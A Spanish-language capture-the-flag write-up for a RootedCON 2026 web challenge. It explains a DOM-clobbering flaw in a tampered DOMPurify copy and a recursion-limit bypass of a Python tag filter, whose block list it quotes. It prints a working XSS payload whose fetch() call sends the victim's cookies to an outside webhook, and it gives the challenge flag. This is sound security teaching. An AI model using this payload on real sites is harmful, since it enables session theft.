# Fortune Cookies

> CTF Track Securiters - RootedCON 2026

> 27/02/2026 18:00 CEST - 01/03/2026 18:00 CEST

* Categoría: Web
* Autor: manbolq
* Dificultad: ★★
* Etiquetas: DOM clobbering, bypass de filtros

## Descripción
    
    Comparte tu sabiduría con el mundo en nuestras galletas de la fortuna. Nuestro equipo de Control de Calidad revisará cada una de tus propuestas para asegurarse de que no escribes tonterías.

## Resolución

El reto consiste en una aplicación Flask donde los usuarios envían mensajes de galletas. La aplicación cuenta con un bot de Playwright que visita las propuestas y tiene la flag almacenada en sus cookies. El objetivo es conseguir un XSS para robar dicha cookie.

La aplicación cuenta con dos capas de defensa:

- Filtro en el server: En el archivo `app.py`, antes de guardar el mensaje, se pasa por una función llamada `sanitize_html`. Esta función utiliza recursión para buscar y eliminar etiquetas peligrosas (como \<script\>, \<iframe\>, \<div\>, etc.) basándose en expresiones regulares.
- Sanitización en el Cliente (DOMPurify): En la página de previsualización (/view/\<id>), el contenido se renderiza utilizando la librería DOMPurify para evitar cualquier intento de XSS remanente.

### DOM Clobbering en DOMPurify

Al revisar el archivo `static/js/purify.min.js`, notamos que no es la versión oficial. El script está ofuscado y podemos ver que tiene un fragmento de código un poco extraño:

```js
var d = document.forms['_config'];
if (d) {
    var e = document.forms[d['f1']['value']];
    var f = e[d['i1']['value']];
    var g = f['ownerDocument']['forms'][d['f2']['value']];
    var h = g[d['i2']['value']];
    if (h) new Function(h['value'])();
}
```

Este código es vulnerable a DOM Clobbering. Podemos inyectar elementos HTML (como formularios e inputs) con atributos `id` y `name` específicos para "secuestrar" las variables del script y obligarlo a ejecutar código a través del constructor `new Function()`. DOMPurify, en su configuración por defecto, admite esas etiquetas con esos atributos.

Un payload que nos serviría para epxlotar esta vulnerabilidad sería el siguiente:

```html
<form id="_config">
  <input name="f1" value="formA">
  <input name="i1" value="inputB">
  <input name="f2" value="formC">
  <input name="i2" value="inputD">
</form>
<form id="formA">
  <input name="inputB" value=":D">
</form>
<form id="formC">
  <input name="inputD" value="fetch('http://webhook?c='+encodeURIComponent(document.cookie));">
</form>
```

### Bypass del filtro personalizado

Aunque ese payload funciona, aún tenemos que bypassear la función `sanitize_html`:

```py

def sanitize_html(text):
    try:
        text = re.sub(r'<!--.*?-->', '', text, flags=re.DOTALL | re.IGNORECASE)
        dangerous_tags = [
            'script', 'iframe', 'object', 'embed', 'applet', 'meta', 'link',
            'base', 'style', 'svg', 'math', 'template', 'frameset', 'frame',
            'noscript', 'xmp', 'plaintext', 'form', 'input', 'button', 'textarea',
            'select', 'option', 'video', 'audio', 'source', 'track', 'canvas', 
            'details', 'summary', 'marquee', 'blink', 'layer', 'ilayer', 'div'
            'bgsound', 'basefont', 'portal', 'isindex', 'shadow', 'vibe', 'data'
        ]
        
        tag_pattern = r'|'.join(dangerous_tags)
        pattern = r'<(/?(?:' + tag_pattern + r'|on\w+))(?:\s+[^>]*?)?>'
    
        def _recursive_strip(current_text):
            match = re.search(pattern, current_text, flags=re.IGNORECASE)
            if match:  
                new_text = re.sub(pattern, '', current_text, count=1, flags=re.IGNORECASE)
                return _recursive_strip(new_text)
            return current_text

        return _recursive_strip(text)
    except:
        return text
```

A simple vista, parece que no hay nada incorrecto: la función elimina recursivamente etiquetas HTML. Sin embargo, python tiene un límite de recursividad. Para verlo, podemos ejecutar esto:

```python
import sys
sys.getrecursionlimit()
```

En este caso, el límite es 1000. Por tanto, si ponemos más de 1000 etiquetas, la función `sanitize_html` lanzará una excepción, y el texto se devolverá sin sanitizar. Así, el payload final para lograr XSS sería:

```html
<form></form><form></form> ......1000 veces......<form></form>
<form id="_config">
  <input name="f1" value="formA">
  <input name="i1" value="inputB">
  <input name="f2" value="formC">
  <input name="i2" value="inputD">
</form>
<form id="formA">
  <input name="inputB" value=":D">
</form>
<form id="formC">
  <input name="inputD" value="fetch('http://webhook?c='+encodeURIComponent(document.cookie));">
</form>
```




> **flag: clctf{cl0b_cl0bb3r3d_cl0bb3r1ng_cl0bcl0b}**